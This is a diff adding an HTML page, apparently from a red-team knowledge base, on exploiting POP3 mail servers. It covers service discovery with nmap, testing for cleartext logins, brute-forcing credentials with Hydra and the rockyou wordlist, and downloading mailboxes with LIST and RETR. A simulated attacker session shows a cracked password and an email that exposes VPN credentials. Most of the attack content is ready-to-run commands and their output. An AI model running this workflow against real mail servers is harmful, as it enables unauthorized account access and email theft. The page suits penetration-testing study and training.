@@ -1,0 +1,199 @@
+<!-- Title -->
+<h1 class="text-2xl font-bold mb-2">POP3 Exploitation</h1>
+<p class="text-gray-300 mb-4">
+  Domain: <strong>Email Security</strong> • Focus: <strong>POP3 Credential Abuse & Mailbox Exfiltration</strong> • Last Updated: <strong>2025-09-05</strong>
+</p>
+
+<!-- Summary -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Summary</h2>
+  <p class="text-gray-300">
+    POP3 (Post Office Protocol v3) is used to retrieve emails from mail servers, 
+    typically on TCP/110 (cleartext) or 995 (SSL/TLS). Attackers exploit POP3 
+    through weak credentials, plaintext logins, brute-force attacks, and protocol 
+    downgrade attempts. Once compromised, mailboxes can be downloaded in full, 
+    exposing sensitive information. POP3 exploitation remains common in Red Team 
+    operations targeting legacy systems, small businesses, and poorly secured ISPs.
+  </p>
+</section>
+
+<!-- Why Exploitable -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
+  <ul class="list-disc ml-5 text-gray-200 space-y-2">
+    <li><strong>Cleartext Logins:</strong> POP3 on TCP/110 often accepts credentials without encryption.</li>
+    <li><strong>Weak Passwords:</strong> Users frequently reuse or select guessable passwords.</li>
+    <li><strong>Brute Force Exposure:</strong> POP3 services are often exposed to the internet.</li>
+    <li><strong>Email Exfiltration:</strong> Attackers can download entire inboxes.</li>
+    <li><strong>Downgrade Attacks:</strong> Forcing fallback from SSL/TLS to plaintext.</li>
+  </ul>
+</section>
+
+<!-- How Exploitation Works -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li><strong>Discovery:</strong> Identify POP3 service on TCP/110 or 995.</li>
+    <li><strong>Authentication Test:</strong> Check for plaintext login support.</li>
+    <li><strong>Brute Force:</strong> Use Hydra/Ncrack to guess user credentials.</li>
+    <li><strong>Mailbox Access:</strong> Retrieve and download email messages.</li>
+    <li><strong>Impact:</strong> Data theft, phishing preparation, credential harvesting.</li>
+  </ol>
+</section>
+
+<!-- Steps -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Steps</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li>Scan and fingerprint POP3 services.</li>
+    <li>Test for cleartext authentication.</li>
+    <li>Attempt brute-force login attacks.</li>
+    <li>Retrieve messages using POP3 commands (LIST, RETR, DELE).</li>
+    <li>Exfiltrate sensitive inbox contents.</li>
+  </ol>
+</section>
+
+<!-- Commands -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Commands</h2>
+  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">
+
+# ------------------------------
+# Discovery
+# ------------------------------
+nmap -p110,995 -sV --script pop3* [target]
+
+# ------------------------------
+# Authentication Test
+# ------------------------------
+telnet [target] 110
+USER victim@example.com
+PASS password123
+
+openssl s_client -connect [target]:995
+USER victim@example.com
+PASS password123
+
+# ------------------------------
+# Brute Force
+# ------------------------------
+hydra -l victim@example.com -P rockyou.txt pop3://[target]
+hydra -L users.txt -P passwords.txt -s 995 -S pop3://[target]
+
+# ------------------------------
+# Retrieve Emails
+# ------------------------------
+telnet [target] 110
+USER victim@example.com
+PASS secret123
+LIST
+RETR 1
+RETR 2
+DELE 3
+
+# ------------------------------
+# Example Workflow
+# ------------------------------
+nmap -p110,995 -sV 192.168.1.50
+hydra -l victim@example.com -P rockyou.txt pop3://192.168.1.50
+telnet 192.168.1.50 110
+USER victim@example.com
+PASS Summer2025!
+LIST
+RETR 1
+  </pre>
+</section>
+
+<!-- Real-World Exploitation Walkthrough -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to expand attacker session
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+[ saide ~ ]$ nmap -p110,995 -sV 192.168.1.50
+PORT    STATE SERVICE VERSION
+110/tcp open  pop3    Dovecot pop3d
+995/tcp open  pop3s   Dovecot pop3s
+
+[ saide ~ ]$ hydra -l victim@example.com -P rockyou.txt pop3://192.168.1.50
+[110][pop3] host: 192.168.1.50   login: victim@example.com   password: Summer2025!
+
+[ saide ~ ]$ telnet 192.168.1.50 110
++OK Dovecot ready.
+USER victim@example.com
++OK
+PASS Summer2025!
++OK Logged in.
+
+LIST
++OK 5 messages
+1 1204
+2 882
+3 1412
+
+RETR 1
++OK 1204 octets
+From: admin@corp.local
+Subject: VPN Access Credentials
+Body: Username: vpnuser Password: CorpVPN2025!
+.
+    </pre>
+  </details>
+</section>
+
+<!-- Example Results -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to view sample POP3 exploitation results
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+# Banner Grab
++OK Dovecot ready.
+
+# Brute Force Result
+victim@example.com : Summer2025!
+
+# Mailbox Enumeration
+LIST → 5 messages
+1 1204
+2 882
+3 1412
+
+# Sensitive Email
+Subject: VPN Access Credentials
+Username: vpnuser
+Password: CorpVPN2025!
+
+# Proof of Exploitation
+Full mailbox accessed and exfiltrated
+    </pre>
+  </details>
+</section>
+
+<!-- References -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
+  <h2 class="text-lg font-semibold mb-2">References</h2>
+  <ul class="list-disc ml-5 text-gray-200">
+    <li>
+      <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-pop" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        HackTricks – Pentesting POP3
+      </a>
+    </li>
+    <li>
+      <a href="https://attack.mitre.org/techniques/T1114/" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        MITRE ATT&CK – Email Collection
+      </a>
+    </li>
+    <li>Red Team workflow: Discovery → Brute force → Inbox access → Email exfiltration → Credential reuse.</li>
+  </ul>
+</section>
